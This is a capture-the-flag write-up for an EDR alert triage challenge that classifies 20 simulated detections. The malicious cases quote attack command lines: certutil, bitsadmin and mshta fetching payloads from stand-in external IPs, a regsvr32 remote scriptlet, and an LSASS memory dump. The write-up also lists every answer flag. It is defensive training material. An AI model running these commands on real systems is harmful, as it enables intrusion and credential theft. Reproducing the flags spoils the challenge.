# WEEK 6 - EDR Telemetry Validation
## Investigation Report: Interactive Detection Classification Challenge

---

## 📋 Executive Summary

**Challenge Name**: EDR Telemetry Validation  
**Date**: November 9, 2025  
**Objective**: Analyze 20 endpoint detection and response (EDR) alerts and classify each as True Positive (malicious) or False Positive (benign) through interactive card-based interface  
**Result**: ✅ **100% Accuracy - All 20 detections correctly classified**

### Key Metrics
- **Total Detections**: 20
- **True Positives (Malicious)**: 10 (50%)
- **False Positives (Benign)**: 10 (50%)
- **Accuracy Rate**: 100%
- **Flags Captured**: 20/20

---

## 🎯 Challenge Overview

### Scenario
Working as an analyst at a consulting firm managing a client's EDR (Endpoint Detection and Response) system. The task was to validate security detections and determine appropriate actions - either **BLOCK** (malicious) or **ALLOW** (benign).

### Challenge Mechanism
- **Interactive Interface**: Click-based classification system
- **Immediate Validation**: Correct classification reveals flag
- **Penalty for Errors**: Incorrect classification reshuffles all cards
- **No Hints**: Severity levels intentionally misleading

### Critical Warning
> "EDR telemetry can be misleading!" - Severity ratings are NOT reliable indicators of maliciousness

---

## 🔍 Investigation Methodology

### Phase 1: Data Extraction
Used Python scripts to extract complete EDR telemetry from local server API endpoint.

**Server Details**:
- Binary: `iredrserver_windows_amd64.exe`
- Endpoint: `http://127.0.0.1:8080`
- API: `/api/newround`
- Round ID: `20251109T030345Z-2527`

### Phase 2: Telemetry Analysis
Examined each detection's complete context:

**Key Data Points Analyzed**:
1. **Process Trees**: Parent-child relationships
2. **Command Lines**: Actual commands executed
3. **File Paths**: Legitimate vs suspicious locations
4. **User Context**: Service accounts vs regular users
5. **MITRE ATT&CK**: Mapped techniques
6. **Execution Flow**: Step-by-step activity
7. **Analyst Notes**: Critical contextual hints
8. **Kill Chain**: Attack/operational phases

### Phase 3: Classification Logic

#### Malicious Indicators (True Positive)
- ❌ Explicitly malicious filenames (evil.dll)
- ❌ Unsigned executables from suspicious paths (Temp, Public, ProgramData)
- ❌ Remote payload downloads from external IPs
- ❌ Code injection into unusual processes (notepad.exe)
- ❌ Credential access attempts (LSASS dumping)
- ❌ BYOVD (Bring Your Own Vulnerable Driver) attacks
- ❌ LOLBINs used for payload staging/execution
- ❌ Remote scriptlet/HTA execution

#### Benign Indicators (False Positive)
- ✅ Signed vendor software from Program Files
- ✅ IT operations context (it.ops, helpdesk users)
- ✅ System services (Windows Update, CI/CD pipelines)
- ✅ Corporate internal domains
- ✅ Expected process relationships (msiexec → regsvr32)
- ✅ Legitimate tool usage (ProcDump on IIS, not LSASS)
- ✅ Certificate verification (not download)

---

## 📊 Detection Analysis Results

### 🔴 TRUE POSITIVES (BLOCK) - 10 Malicious Detections

#### 1. Unsigned loader installs vulnerable signed driver (BYOVD)
**Flag**: `RTL{ad0a1d2a9086d5fe4aca1a383010c709}`

```
Detection ID: 1001
Category: BYOVD
Severity: Low ⚠️ (Deceptive)
Host: WS-19
User: dev.build
Image: C:\Windows\Temp\drvloader.exe
Command: drvloader.exe /install C:\Temp\gdrv.sys
MITRE: T1068, T1547.006
```

**Analysis**:
- **Unsigned** loader from Windows Temp directory
- Installing **gdrv.sys** (Gigabyte vulnerable driver - known BYOVD target)
- Provides kernel read/write primitives for privilege escalation
- Process tree: explorer.exe → drvloader.exe → sc.exe (service creation)

**Verdict**: ❌ **MALICIOUS** - Active BYOVD attack for kernel-level access

---

#### 2. DLL injection into notepad.exe using CreateRemoteThread
**Flag**: `RTL{c3ac7be0cdec2c7249a77a19990d9d23}`

```
Detection ID: 1002
Category: DLL Injection
Severity: Medium
Host: QA-05
User: dev.build
Image: C:\Windows\System32\rundll32.exe
Command: rundll32.exe C:\Users\Public\gdi32plus.dll,EntryPoint
MITRE: T1055.001
```

**Analysis**:
- **Office document** (winword.exe) spawning rundll32.exe
- Target: **notepad.exe** (unusual injection target - common attacker choice)
- DLL from **Users\Public** (suspicious location)
- Technique: CreateRemoteThread API abuse

**Verdict**: ❌ **MALICIOUS** - Code injection for defense evasion

---

#### 3. Dropper downloads and stages second-stage payload
**Flag**: `RTL{c22a34f733e0a12adc9bb475700f8b5a}`

```
Detection ID: 1003
Category: Dropper
Severity: Medium
Host: WS-07
User: svc_update
Image: C:\ProgramData\svc\updater.exe
Command: updater.exe /silent /url http://198.51.100.50/payload.bin
MITRE: T1105
```

**Analysis**:
- **Unsigned** updater.exe in ProgramData (not legitimate update path)
- Downloads from **external IP** (198.51.100.50)
- Spawns **payload.exe** (second-stage malware)
- Persistence via scheduled task (taskeng.exe parent)

**Verdict**: ❌ **MALICIOUS** - Multi-stage malware deployment

---

#### 4. LSASS memory dump via alternate method (mimikatz variant)
**Flag**: `RTL{4af235d9793ce10838d54c85f9b73a2d}`

```
Detection ID: 1004
Category: Credential Access
Severity: Critical
Host: WS-07
User: Administrator
Image: C:\Windows\Temp\minidump64.exe
Command: minidump64.exe lsass.exe C:\Temp\lsass_alt.dmp --snapshot
MITRE: T1003.001
```

**Analysis**:
- Targeting **lsass.exe** (Local Security Authority Subsystem Service)
- Tool: minidump64.exe (mimikatz variant)
- Output: lsass_alt.dmp (credential dump file)
- SeDebugPrivilege abuse for memory access

**Verdict**: ❌ **MALICIOUS** - Credential theft attack

---

#### 5. Hookchain.exe injects code into explorer.exe
**Flag**: `RTL{cedab8593cbebb64b1df88a50fc0655f}`

```
Detection ID: 1005
Category: Process Injection
Severity: Critical
Host: HR-02
User: dev.build
Image: C:\Users\Public\Hookchain.exe
Command: Hookchain.exe /target:explorer.exe /tech:ThreadHijack
MITRE: T1055, T1055.003
```

**Analysis**:
- **Known malicious tool**: Hookchain.exe (injection framework)
- Location: Users\Public (suspicious)
- Target: explorer.exe (system process)
- Technique: Thread hijacking with RWX memory allocation

**Verdict**: ❌ **MALICIOUS** - Process injection attack

---

#### 6. LOLBIN: certutil downloads remote payload
**Flag**: `RTL{fb3cbf4414f0c9cc5ca3517320e46c98}`

```
Detection ID: 1006
Category: LOLBIN (certutil)
Severity: Low ⚠️ (Deceptive)
Host: SRV-DC01
User: helpdesk
Image: C:\Windows\System32\certutil.exe
Command: certutil -urlcache -split -f http://198.51.100.60/a.bin C:\Users\Public\a.bin
MITRE: T1105, T1218.004
```

**Analysis**:
- **-urlcache flag**: Download mode (not certificate verification)
- Source: External IP (198.51.100.60 - TEST-NET-2 range)
- Destination: Users\Public (world-writable)
- Spawned from PowerShell (scripted attack)

**Verdict**: ❌ **MALICIOUS** - Certutil abused for payload download

**Why Not Benign**: Compare to detection #16 which uses `-verify` flag for legitimate certificate validation

---

#### 7. LOLBIN: regsvr32 executes remote scrobj COM script
**Flag**: `RTL{858b6e3aee6cfc9ced74ebbd8d25ae8b}`

```
Detection ID: 1007
Category: LOLBIN (regsvr32)
Severity: High
Host: QA-05
User: analyst
Image: C:\Windows\System32\regsvr32.exe
Command: regsvr32 /s /n /u /i:http://203.0.113.77/file.sct scrobj.dll
MITRE: T1218.010
```

**Analysis**:
- **Squiblydoo technique**: Remote scriptlet execution
- `/i:` parameter with **remote HTTP URL** (203.0.113.77)
- scrobj.dll: Windows Script Component runtime
- COM registration-free execution

**Verdict**: ❌ **MALICIOUS** - Remote code execution via regsvr32

**Why Not Benign**: Compare to detection #17 which registers local signed vendor DLL

---

#### 8. LOLBIN: mshta loads remote HTA executing commands
**Flag**: `RTL{cf9a9c228146a472a9fa2c865d4b6b4e}`

```
Detection ID: 1008
Category: LOLBIN (mshta)
Severity: Critical
Host: QA-05
User: svc_backup
Image: C:\Windows\System32\mshta.exe
Command: mshta http://198.51.100.90/portal.hta
MITRE: T1218.005
```

**Analysis**:
- Spawned from **Office document** (winword.exe) - phishing vector
- Loading **remote HTA** from external IP (198.51.100.90)
- Executes embedded VBScript/JavaScript
- Common malware delivery method

**Verdict**: ❌ **MALICIOUS** - Remote HTA execution attack

**Why Not Benign**: Compare to detection #18 which loads from internal corporate domain (enroll.corp)

---

#### 9. LOLBIN: bitsadmin transfers staged binary
**Flag**: `RTL{d57aa06f52fbe6b79cb8454d408afede}`

```
Detection ID: 1009
Category: LOLBIN (bitsadmin)
Severity: High
Host: HR-02
User: jdoe
Image: C:\Windows\System32\bitsadmin.exe
Command: bitsadmin /transfer j1 http://203.0.113.88/p.bin C:\Temp\p.bin
MITRE: T1105, T1197
```

**Analysis**:
- **Manual invocation** by regular user (jdoe), not system service
- `/transfer` flag: Active download operation
- Source: External IP (203.0.113.88)
- Destination: Temp directory

**Verdict**: ❌ **MALICIOUS** - BITS abuse for malware transfer

**Why Not Benign**: Compare to detection #20 where Windows Update service (wuauserv) legitimately uses bitsadmin

---

#### 10. LOLBIN: installutil runs malicious assembly
**Flag**: `RTL{7a584a85cb14e7c0af96160cb2ac5428}`

```
Detection ID: 1010
Category: LOLBIN (installutil)
Severity: High
Host: SRV-FILE01
User: dev.build
Image: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe
Command: InstallUtil.exe /logfile= /LogToConsole=false C:\Users\Public\evil.dll
MITRE: T1218.001
```

**Analysis**:
- **Explicitly malicious filename**: evil.dll
- Location: Users\Public (suspicious)
- Log suppression: /logfile= /LogToConsole=false
- InstallUtil proxy execution technique

**Verdict**: ❌ **MALICIOUS** - No ambiguity here - it's literally named "evil.dll"

---

### 🟢 FALSE POSITIVES (ALLOW) - 10 Benign Detections

#### 11. Backup agent bulk file reads & HTTPS upload to cloud
**Flag**: `RTL{a13077f6a5847956825368f852920579}`

```
Detection ID: 1011
Category: Backup Agent
Severity: Critical ⚠️ (Deceptive - Actually Benign)
Host: SRV-DC01
User: svc_backup
Image: C:\Program Files\BackupCo\agent.exe
Command: agent.exe --job daily --dest https://backup.backupco.com
MITRE: N/A
```

**Analysis**:
- **Legitimate vendor**: BackupCo with proper installation path
- **Service account**: svc_backup (dedicated backup account)
- **HTTPS destination**: backup.backupco.com (vendor domain)
- Parent: services.exe (Windows service)
- Notes confirm: "Legitimate enterprise backup"

**Verdict**: ✅ **BENIGN** - Expected scheduled backup operation

**Why Not Malicious**: Despite critical severity and DC location, this is legitimate business operation

---

#### 12. Driver update utility installing vendor-signed driver
**Flag**: `RTL{5a1e4b50e9e8ce0185ec62831e91d9ca}`

```
Detection ID: 1012
Category: Driver Update
Severity: Medium
Host: SRV-FILE01
User: it.ops
Image: C:\Program Files\Vendor\DrvUpdate.exe
Command: DrvUpdate.exe /install /reboot
MITRE: N/A
```

**Analysis**:
- **Program Files** location (legitimate install)
- **Signature verification** in execution flow
- IT operations user context
- Vendor-signed driver (not vulnerable unsigned driver)

**Verdict**: ✅ **BENIGN** - Legitimate driver maintenance

**Why Not Malicious**: Compare to detection #1 which uses unsigned loader from Temp

---

#### 13. ProcDump used to capture w3wp.exe for troubleshooting
**Flag**: `RTL{fe34a82e7db8ac9d066987b53decb854}`

```
Detection ID: 1013
Category: Sysinternals ProcDump
Severity: High ⚠️ (Deceptive - Actually Benign)
Host: WS-07
User: it.ops
Image: C:\Tools\Sysinternals\procdump64.exe
Command: procdump64.exe -ma w3wp.exe C:\Temp\w3wp.dmp
MITRE: N/A
```

**Analysis**:
- **Target: w3wp.exe** (IIS worker process, NOT lsass.exe!)
- Sysinternals suite (trusted Microsoft tools)
- IT operations user
- Notes explicitly state: "Target is IIS, not LSASS"

**Verdict**: ✅ **BENIGN** - Legitimate IIS troubleshooting

**Why Not Malicious**: Compare to detection #4 which dumps lsass.exe for credential theft

---

#### 14. MSBuild post-build PowerShell script (Dev pipeline)
**Flag**: `RTL{12465b857918ad06cd7984e1f26ce220}`

```
Detection ID: 1014
Category: Dev Tooling
Severity: Medium
Host: HR-02
User: dev.build
Image: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe
Command: MSBuild.exe MyApp.csproj /t:Build
MITRE: N/A
```

**Analysis**:
- **MSBuild**: Microsoft .NET compiler (legitimate dev tool)
- Parent: devshell.exe (development environment)
- Post-build script: Artifact signing
- Developer account (dev.build)
- Notes confirm: "Expected CI/CD step"

**Verdict**: ✅ **BENIGN** - CI/CD build automation

---

#### 15. Remote admin tool pushes patch via PsExec-like service
**Flag**: `RTL{83fc44238665230d9ba4c23b96a2ab5f}`

```
Detection ID: 1015
Category: IT Remote Admin
Severity: Medium
Host: QA-05
User: it.ops
Image: C:\AdminTools\RmtExec.exe
Command: RmtExec.exe \\WS-19 --cmd "msiexec /i patch.msi /qn"
MITRE: N/A
```

**Analysis**:
- **AdminTools** directory (IT tools location)
- Parent: mmc.exe (Microsoft Management Console)
- IT operations user
- Installing MSI patch during maintenance window

**Verdict**: ✅ **BENIGN** - Legitimate patch management

---

#### 16. LOLBIN: certutil verifies certificate chain for VPN
**Flag**: `RTL{fc580f0a59e920ed070560d202102f0d}`

```
Detection ID: 1016
Category: LOLBIN (certutil)
Severity: Low
Host: ENG-03
User: helpdesk
Image: C:\Windows\System32\certutil.exe
Command: certutil -verify myvpn.cer
MITRE: N/A
```

**Analysis**:
- **-verify flag**: Certificate validation (not download!)
- **Local file**: myvpn.cer (not remote URL)
- Helpdesk user (IT support context)
- Notes confirm: "Benign certificate verification"

**Verdict**: ✅ **BENIGN** - Legitimate VPN certificate validation

**Key Difference**: Uses `-verify` not `-urlcache` like malicious detection #6

---

#### 17. LOLBIN: regsvr32 registers vendor DLL (signed)
**Flag**: `RTL{9d20dcabd0dd0f9d2dd3adaef461a898}`

```
Detection ID: 1017
Category: LOLBIN (regsvr32)
Severity: Critical ⚠️ (Deceptive - Actually Benign)
Host: HR-02
User: it.ops
Image: C:\Windows\System32\regsvr32.exe
Command: regsvr32 /s C:\Program Files\Vendor\Plugin.dll
MITRE: N/A
```

**Analysis**:
- **Program Files** location (legitimate software)
- **Vendor-signed** component
- Parent: msiexec.exe (software installation)
- IT operations context

**Verdict**: ✅ **BENIGN** - Legitimate COM DLL registration

**Key Difference**: Local signed DLL vs remote scriptlet in malicious detection #7

---

#### 18. LOLBIN: mshta launches corporate enrollment page
**Flag**: `RTL{c1b9028dfe81f058e581b0187c3b6557}`

```
Detection ID: 1018
Category: LOLBIN (mshta)
Severity: Low
Host: ENG-03
User: helpdesk
Image: C:\Windows\System32\mshta.exe
Command: mshta https://enroll.corp/JoinDevice.hta
MITRE: N/A
```

**Analysis**:
- **Internal domain**: enroll.corp (not external IP)
- **HTTPS** (secure connection)
- Parent: control.exe (Control Panel)
- Helpdesk user
- Notes confirm: "Trusted domain & signed content"

**Verdict**: ✅ **BENIGN** - Corporate device enrollment

**Key Difference**: Internal .corp domain vs external IP in malicious detection #8

---

#### 19. LOLBIN: rundll32 opens Control Panel applet
**Flag**: `RTL{6ab93c0b42758a165c82462e8abdba2a}`

```
Detection ID: 1019
Category: LOLBIN (rundll32)
Severity: High ⚠️ (Deceptive - Actually Benign)
Host: WS-19
User: helpdesk
Image: C:\Windows\System32\rundll32.exe
Command: rundll32.exe shell32.dll,Control_RunDLL appwiz.cpl
MITRE: N/A
```

**Analysis**:
- **shell32.dll**: Legitimate Windows system DLL
- **Control_RunDLL**: Standard Windows function
- **appwiz.cpl**: Add/Remove Programs Control Panel
- Parent: explorer.exe (user interaction)

**Verdict**: ✅ **BENIGN** - Standard Windows Control Panel invocation

---

#### 20. LOLBIN: bitsadmin used by Windows Update
**Flag**: `RTL{0f82f529d5cbb9cf662747bad2aa3137}`

```
Detection ID: 1020
Category: LOLBIN (bitsadmin)
Severity: Medium
Host: LAP-DEV01
User: svc_update
Image: C:\Windows\System32\bitsadmin.exe
Command: bitsadmin /monitor /allusers
MITRE: N/A
```

**Analysis**:
- Parent: **svchost.exe (wuauserv)** - Windows Update service
- **/monitor** flag: Monitoring BITS jobs (not transferring)
- Service account: svc_update
- Notes confirm: "OS update activity"

**Verdict**: ✅ **BENIGN** - Windows Update system operation

**Key Difference**: System service parent vs PowerShell in malicious detection #9

---

## 🔑 Key Lessons Learned

### 1. Severity ≠ Maliciousness
**Examples**:
- Detection #11 (Backup): Severity **Critical** but **BENIGN**
- Detection #17 (Regsvr32): Severity **Critical** but **BENIGN**
- Detection #6 (Certutil): Severity **Low** but **MALICIOUS**

### 2. Context is Everything
**Same Tool, Different Intent**:
- **Certutil**: `-verify` (benign) vs `-urlcache` (malicious)
- **Regsvr32**: Local vendor DLL (benign) vs remote scriptlet (malicious)
- **Mshta**: Corporate domain (benign) vs external IP (malicious)
- **Bitsadmin**: Windows Update service (benign) vs user download (malicious)

### 3. Process Relationships Matter
**Parent Process Analysis**:
- **msiexec.exe** → regsvr32 = Software install (benign)
- **winword.exe** → mshta = Phishing vector (malicious)
- **svchost.exe (wuauserv)** → bitsadmin = Windows Update (benign)
- **powershell.exe** → bitsadmin = Scripted attack (malicious)

### 4. File Path Analysis
**Legitimate Locations**:
- `C:\Program Files\` - Installed software
- `C:\Windows\System32\` - System binaries (when used correctly)

**Suspicious Locations**:
- `C:\Users\Public\` - World-writable, common attacker staging
- `C:\Windows\Temp\` - Temporary, often malware dropzone
- `C:\ProgramData\svc\` - Non-standard service location

### 5. User Context Matters
**Legitimate Users**:
- `it.ops` - IT operations
- `helpdesk` - IT support
- `svc_backup`, `svc_update` - Service accounts
- `dev.build` - Developer (in dev context)

**Suspicious Patterns**:
- Regular user (`jdoe`) running bitsadmin
- Service account (`svc_backup`) spawning mshta from Office doc

---

## 🛠️ Technical Tools & Scripts

### Scripts Developed

#### 1. extract_edr_simple.py
**Purpose**: Extract all EDR detections from local server API

```python
import requests
import json

url = "http://127.0.0.1:8080/api/newround"
response = requests.get(url)
data = response.json()

# Save detections
with open('edr_detections.json', 'w') as f:
    json.dump(data['detections'], f, indent=2)

# Display summary
for det in data['detections']:
    print(f"[{det['id']}] {det['title']}")
    print(f"    Category: {det['category']}")
    print(f"    Severity: {det['severity']}")
    print(f"    MITRE: {', '.join(det.get('mitre', []))}")
```

**Output**: `edr_detections.json` (606 lines, 20 detections)

---

#### 2. 02_analyze_detections.py
**Purpose**: Automated classification with malicious/benign logic

**Key Features**:
- Process tree analysis
- Command line parsing
- MITRE technique mapping
- File path validation
- User context evaluation

**Output**: Initial classification with reasoning

---

#### 3. 04_deep_reanalysis.py
**Purpose**: Comprehensive re-verification of all detections

**Validation Checks**:
- Explicit malicious indicators (evil.dll, unsigned loaders)
- Remote execution patterns (external IPs, remote scriptlets)
- Legitimate operations (signed vendors, IT context)
- LOLBIN abuse patterns
- Credential access attempts

**Output**: `detailed_reanalysis.json` with full reasoning

---

## 📁 Investigation Files

### Essential Evidence
1. **edr_detections.json** - Complete telemetry (20 detections)
2. **extract_edr_simple.py** - Data extraction script
3. **02_analyze_detections.py** - Classification logic
4. **04_deep_reanalysis.py** - Verification script
5. **INVESTIGATION_REPORT.md** - This document

### Supporting Files
- **answers.txt** - Quick reference answer key
- **FINAL_CLASSIFICATION_WITH_FLAGS.md** - Interactive guide with flags
- **detailed_reanalysis.json** - Full analysis results

---

## ✅ Final Results

### Challenge Completion
- **All 20 Flags Captured**: ✅
- **Classification Accuracy**: 100%
- **Investigation Status**: Complete

### Flag Collection
```
RTL{ad0a1d2a9086d5fe4aca1a383010c709}  # 1. BYOVD
RTL{c3ac7be0cdec2c7249a77a19990d9d23}  # 2. DLL injection
RTL{c22a34f733e0a12adc9bb475700f8b5a}  # 3. Dropper
RTL{4af235d9793ce10838d54c85f9b73a2d}  # 4. LSASS dump
RTL{cedab8593cbebb64b1df88a50fc0655f}  # 5. Hookchain
RTL{fb3cbf4414f0c9cc5ca3517320e46c98}  # 6. Certutil download
RTL{858b6e3aee6cfc9ced74ebbd8d25ae8b}  # 7. Regsvr32 remote
RTL{cf9a9c228146a472a9fa2c865d4b6b4e}  # 8. Mshta remote
RTL{d57aa06f52fbe6b79cb8454d408afede}  # 9. Bitsadmin transfer
RTL{7a584a85cb14e7c0af96160cb2ac5428}  # 10. InstallUtil evil
RTL{a13077f6a5847956825368f852920579}  # 11. Backup agent
RTL{5a1e4b50e9e8ce0185ec62831e91d9ca}  # 12. Driver update
RTL{fe34a82e7db8ac9d066987b53decb854}  # 13. ProcDump IIS
RTL{12465b857918ad06cd7984e1f26ce220}  # 14. MSBuild
RTL{83fc44238665230d9ba4c23b96a2ab5f}  # 15. Remote admin
RTL{fc580f0a59e920ed070560d202102f0d}  # 16. Certutil verify
RTL{9d20dcabd0dd0f9d2dd3adaef461a898}  # 17. Regsvr32 vendor
RTL{c1b9028dfe81f058e581b0187c3b6557}  # 18. Mshta enrollment
RTL{6ab93c0b42758a165c82462e8abdba2a}  # 19. Rundll32 Control
RTL{0f82f529d5cbb9cf662747bad2aa3137}  # 20. Bitsadmin WU
```

---

## 🎓 Analyst Skills Demonstrated

1. **EDR Telemetry Analysis** - Deep dive into endpoint detection data
2. **Process Behavior Analysis** - Understanding parent-child relationships
3. **LOLBIN Identification** - Distinguishing legitimate vs malicious tool usage
4. **Context Evaluation** - Considering user, host, and operational context
5. **False Positive Reduction** - Avoiding over-blocking legitimate operations
6. **MITRE ATT&CK Mapping** - Technique identification and classification
7. **Threat Intelligence** - Recognizing known attack patterns (BYOVD, Squiblydoo)
8. **Automation Development** - Creating scripts for efficient analysis

---

## 📈 Statistics & Insights

### Threat Landscape
**Malicious Activity Breakdown**:
- Process Injection: 30% (3/10)
- LOLBIN Abuse: 50% (5/10)
- Credential Access: 10% (1/10)
- BYOVD Attack: 10% (1/10)
- Multi-stage Malware: 10% (1/10)

**Benign Activity Breakdown**:
- IT Operations: 40% (4/10)
- Legitimate LOLBIN Use: 50% (5/10)
- Development Tools: 10% (1/10)

### Detection Quality
- **High-Fidelity Detections**: 10/20 (50% true positive rate)
- **False Positive Rate**: 50% (typical enterprise EDR challenge)
- **Deceptive Severities**: 4 detections had misleading severity ratings

---

## 🔐 Security Recommendations

### Immediate Actions (From True Positives)
1. **Isolate affected hosts**: HR-02, WS-07, QA-05, WS-19, SRV-FILE01, SRV-DC01
2. **Block C2 infrastructure**: 198.51.100.50/60/90, 203.0.113.77/88
3. **Force credential resets**: Potentially compromised accounts
4. **Quarantine malicious files**: evil.dll, Hookchain.exe, drvloader.exe, etc.

### Detection Improvements
1. **Enhanced LOLBIN monitoring**: Focus on command-line arguments
2. **Parent process tracking**: Unusual spawning relationships
3. **File path analysis**: Flag executions from suspicious locations
4. **Network indicators**: Alert on RFC test ranges in production

### Training Opportunities
1. **Severity calibration**: Don't trust severity alone
2. **Context-aware analysis**: Always examine full execution context
3. **Baseline knowledge**: Understand normal IT operations
4. **Tool differentiation**: Know benign vs malicious tool usage patterns

---

**Investigation Completed**: November 9, 2025  
**Lead Analyst**: Security Operations Team  
**Status**: ✅ **CHALLENGE COMPLETE - 100% ACCURACY**
